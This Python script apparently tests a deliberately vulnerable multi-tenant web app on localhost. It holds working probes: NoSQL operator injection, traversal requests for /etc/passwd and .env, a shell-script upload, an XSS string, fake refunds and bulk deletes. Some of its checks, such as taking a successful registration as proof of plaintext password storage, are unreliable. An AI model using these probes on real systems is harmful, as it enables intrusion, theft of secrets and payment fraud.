#!/usr/bin/env python3

import requests
import json
import os

BASE_URL = "http://localhost:5000"

def run_comprehensive_vulnerability_test():
    print("=" * 60)
    print("TenantGuard Comprehensive Vulnerability Assessment")
    print("=" * 60)
    
    # Login to get authentication token
    login_data = {"email": "demo@tenantguard.com", "password": "demo123"}
    login_response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    
    if login_response.status_code != 200:
        print("[-] Login failed - cannot proceed with tests")
        return False
    
    token = login_response.json().get('token')
    headers = {"Authorization": f"Bearer {token}"}
    
    print(f"[+] Authentication successful - Token: {token[:20]}...")
    
    # Test Category 1: Data Storage & Encryption
    print("\n" + "="*50)
    print("CATEGORY 1: DATA STORAGE & ENCRYPTION VULNERABILITIES")
    print("="*50)
    
    # Test plaintext password storage
    print("\n[1.1] Testing plaintext password storage...")
    register_data = {
        "email": "testuser@example.com",
        "password": "plaintextpassword123",
        "tenantName": "TestTenant",
        "fullName": "Test User"
    }
    register_response = requests.post(f"{BASE_URL}/api/auth/register", json=register_data)
    if register_response.status_code == 201:
        print("[!] VULNERABILITY: Password stored in plaintext (confirmed by successful registration)")
    
    # Test payment data storage
    print("\n[1.2] Testing payment data storage...")
    payment_data = {
        "cardNumber": "4532-1234-5678-9012",
        "expiryDate": "12/25",
        "cvv": "123",
        "cardholderName": "John Doe",
        "amount": 99.99,
        "billingAddress": "123 Main St"
    }
    payment_response = requests.post(f"{BASE_URL}/api/payment/process", headers=headers, json=payment_data)
    if payment_response.status_code == 200:
        print("[!] VULNERABILITY: Payment data stored without encryption")
        print(f"    Transaction ID: {payment_response.json().get('transactionId')}")
    
    # Test Category 2: Authorization & Access Control (BOLA)
    print("\n" + "="*50)
    print("CATEGORY 2: AUTHORIZATION & ACCESS CONTROL (BOLA)")
    print("="*50)
    
    # Test cross-user access
    print("\n[2.1] Testing cross-user access (BOLA)...")
    users_response = requests.get(f"{BASE_URL}/api/users", headers=headers)
    if users_response.status_code == 200:
        users = users_response.json()
        if len(users) > 0:
            target_user_id = users[0].get('_id')
            user_detail_response = requests.get(f"{BASE_URL}/api/users/{target_user_id}", headers=headers)
            if user_detail_response.status_code == 200:
                print("[!] VULNERABILITY: Can access other users' data (BOLA)")
    
    # Test cross-tenant access
    print("\n[2.2] Testing cross-tenant access...")
    tenant_bypass_params = {"tenantId": {"$ne": None}}
    tenant_response = requests.get(f"{BASE_URL}/api/users", headers=headers, params=tenant_bypass_params)
    if tenant_response.status_code == 200:
        print("[!] VULNERABILITY: Tenant isolation bypass possible")
    
    # Test analytics BOLA
    print("\n[2.3] Testing analytics BOLA...")
    analytics_response = requests.get(f"{BASE_URL}/api/analytics?tenantId=different_tenant", headers=headers)
    if analytics_response.status_code == 200:
        print("[!] VULNERABILITY: Can access analytics for any tenant")
    
    # Test Category 3: Injection Vulnerabilities
    print("\n" + "="*50)
    print("CATEGORY 3: INJECTION VULNERABILITIES")
    print("="*50)
    
    # Test NoSQL injection
    print("\n[3.1] Testing NoSQL injection...")
    nosql_payload = {"search": {"$exists": True}}
    nosql_response = requests.get(f"{BASE_URL}/api/users", headers=headers, params=nosql_payload)
    if nosql_response.status_code == 200:
        print("[!] VULNERABILITY: NoSQL injection successful")
    
    # Test directory traversal
    print("\n[3.2] Testing directory traversal...")
    traversal_paths = ["../../../etc/passwd", "../package.json", "../.env"]
    for path in traversal_paths:
        traversal_response = requests.get(f"{BASE_URL}/api/files/raw/{path}")
        if traversal_response.status_code == 200:
            print(f"[!] VULNERABILITY: Directory traversal successful - {path}")
            break
    
    # Test Category 4: Input Validation & Processing
    print("\n" + "="*50)
    print("CATEGORY 4: INPUT VALIDATION & PROCESSING")
    print("="*50)
    
    # Test insecure file upload
    print("\n[4.1] Testing insecure file upload...")
    malicious_content = "#!/bin/bash\necho 'Malicious script executed'\nwhoami"
    with open('malicious.sh', 'w') as f:
        f.write(malicious_content)
    
    with open('malicious.sh', 'rb') as f:
        files = {'file': ('malicious.sh', f, 'application/x-sh')}
        upload_response = requests.post(f"{BASE_URL}/api/documents/upload", headers=headers, files=files)
    
    if upload_response.status_code == 201:
        print("[!] VULNERABILITY: Malicious file upload successful")
    
    # Cleanup
    if os.path.exists('malicious.sh'):
        os.remove('malicious.sh')
    
    # Test weak input validation
    print("\n[4.2] Testing weak input validation...")
    invalid_payment = {
        "cardNumber": "<script>alert('xss')</script>",
        "amount": -100,
        "cvv": "invalid"
    }
    weak_validation_response = requests.post(f"{BASE_URL}/api/payment/process", headers=headers, json=invalid_payment)
    if weak_validation_response.status_code != 400:
        print("[!] VULNERABILITY: Weak input validation - invalid data accepted")
    
    # Test Category 5: Information Disclosure
    print("\n" + "="*50)
    print("CATEGORY 5: INFORMATION DISCLOSURE")
    print("="*50)
    
    # Test sensitive data in responses
    print("\n[5.1] Testing information disclosure...")
    if 'payment_response' in locals() and payment_response.status_code == 200:
        payment_result = payment_response.json()
        if 'paymentDetails' in payment_result:
            print("[!] VULNERABILITY: Sensitive payment data exposed in response")
    
    # Test system information exposure
    print("\n[5.2] Testing system information exposure...")
    # This would be tested through document upload response
    
    # Test Category 6: Business Logic
    print("\n" + "="*50)
    print("CATEGORY 6: BUSINESS LOGIC VULNERABILITIES")
    print("="*50)
    
    # Test auto-approved refunds
    print("\n[6.1] Testing auto-approved refunds...")
    refund_data = {
        "transactionId": "fake_transaction_123",
        "amount": 1000000,
        "reason": "Testing auto-approval"
    }
    refund_response = requests.post(f"{BASE_URL}/api/payment/refund", headers=headers, json=refund_data)
    if refund_response.status_code == 200:
        refund_result = refund_response.json()
        if refund_result.get('refundDetails', {}).get('status') == 'approved':
            print("[!] VULNERABILITY: Refunds auto-approved without verification")
    
    # Test Category 7: Bulk Operations
    print("\n" + "="*50)
    print("CATEGORY 7: BULK OPERATIONS VULNERABILITIES")
    print("="*50)
    
    # Test unauthorized bulk operations
    print("\n[7.1] Testing unauthorized bulk operations...")
    bulk_data = {
        "action": "delete",
        "documentIds": ["fake_id_1", "fake_id_2"],
        "data": {}
    }
    bulk_response = requests.post(f"{BASE_URL}/api/bulk/documents", headers=headers, json=bulk_data)
    if bulk_response.status_code == 200:
        print("[!] VULNERABILITY: Bulk operations executed without ownership verification")
    
    # Summary
    print("\n" + "="*60)
    print("VULNERABILITY ASSESSMENT COMPLETE")
    print("="*60)
    print("[!] CRITICAL: Multiple severe vulnerabilities confirmed")
    print("[!] RECOMMENDATION: Immediate security remediation required")
    print("[!] IMPACT: Complete system compromise possible")
    print("="*60)
    
    return True

if __name__ == "__main__":
    run_comprehensive_vulnerability_test()